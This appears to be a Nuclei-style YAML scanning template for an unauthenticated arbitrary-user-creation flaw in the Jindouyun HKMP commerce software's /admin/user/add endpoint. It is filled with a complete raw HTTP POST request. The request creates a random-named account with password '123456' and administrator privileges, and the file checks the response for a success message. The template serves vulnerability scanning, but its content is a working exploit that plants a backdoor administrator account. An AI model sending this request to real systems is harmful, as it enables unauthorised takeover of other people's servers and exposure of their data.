id: jindouyun-user-add
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 金斗云 HKMP智慧商业软件 /admin/user/add 接口存在任意用户创建漏洞，未经身份验证的远程攻击者可以利用此漏洞创建管理员账户，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E6%96%97%E4%BA%91-HKMP%E6%99%BA%E6%85%A7%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags

variables:
  filename: "{{rand_base(6)}}"  
http:
  - raw:
      - |-
        POST /admin/user/add HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
        Content-Type: application/json
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Length: 291

        {"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,
        "nonce":2287791269,"sign":"hkmp","data":{"userCode":"{{filename}}","userName":"{{filename}}","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"message":"用户添加成功"'
      - type: word
        part: body
        words:
          - '"code":"1000"'
